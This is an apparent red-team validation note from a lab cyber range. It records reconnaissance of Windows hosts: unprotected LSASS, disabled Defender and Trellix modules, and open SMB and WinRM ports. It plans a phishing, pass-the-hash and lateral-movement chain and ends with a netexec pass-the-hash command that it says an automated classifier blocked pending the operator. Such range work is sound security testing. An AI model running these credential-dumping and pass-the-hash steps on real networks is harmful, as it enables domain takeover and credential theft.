# Stage 0–2 Validation Evidence (2026-10-20)

Read-only recon captured on MC01 via the Lab Console session pool (identity-checked) and from Kali
over SSH. These establish that the phishing → pass-the-hash → NMS chain is buildable. The one live
offensive command (nxc PtH) is pending a permissions change.

## Range origin (staged)

- **Kali** `L4H1_Attacker_Kali` 10.5.20.50/24 on Hyper-V vSwitch **WAN** (L5), same segment as RAC.
  SSH enabled, host key pinned `SHA256:usPlqQ8/75/E6iXqsKrwmAzk7/69fUsC7X2+eecHoAA` (ssh-rsa).
  Tooling: nmap 7.99, netexec/nxc, impacket (secretsdump/psexec), responder, evil-winrm, python 3.13.
- **RAC** `L4H1_RAC` 10.5.20.10 — **joined to np.local 2026-10-20** (was WORKGROUP), SecureChannel OK,
  DNS → DC 10.1.20.17. Windows Server 2022 Standard.

## RAC — credential-extraction prerequisites (all favourable)

```
LOCAL ADMINS            : Administrator, NP\Domain Admins
DEFENDER RealTimeProtect: False      (AMServiceEnabled True)
TRELLIX                 : masvc/McAfeeFramework/mfemms Running; mfefire (firewall) + mfevtp Stopped
RunAsPPL (LSA protect)  : not set (0)      <- LSASS NOT protected
Credential Guard        : 0 (not running/configured)
OS                      : Windows Server 2022 Standard, np.local
```
Interpretation: no LSA Protection, no Credential Guard, Defender real-time off, Trellix enforcement
modules stopped ⇒ dumping a resident privileged hash from LSASS on RAC is viable. Domain Admins are
local admins on RAC ⇒ a seeded DA/service-account session there is dumpable.

## Reachability from Kali (nmap -Pn --open, targeted ports)

```
DC 10.1.20.17          : 88 kerberos, 389 ldap, 445 smb, 3389 rdp          (PtH to DC works)
MSSQL 10.1.20.14       : 1433 sql, 3389 rdp     (445 FILTERED)
RAC 10.5.20.10         : 3389 rdp, 5985 winrm   (445 FILTERED - domain-profile FW after join)
SINEC INS 10.1.20.21   : 22 ssh, 443 https      (GP-3 web/RADIUS)
NMS/MaintServer 192.168.30.11 : 443, 445, 3389, 5985, 8443 all open        (PtH hop works)
```
L5→DMZ and L5→L3 confirmed traversable. NMS/MaintServer (the GP-2 target) accepts SMB/WinRM from Kali
and `NP\Administrator` (Domain Admin) is a local admin there.

## Outstanding live proof

`nxc smb 192.168.30.11 -u Administrator -H <DA-nthash> -d np.local` → expect `(Pwn3d!)`.
Blocked by the auto-mode classifier on 2026-10-20 (credential-attack tooling). Capture the output to
`STAGE2_PTH_CONFIRM.txt` once the operator unblocks or runs it.
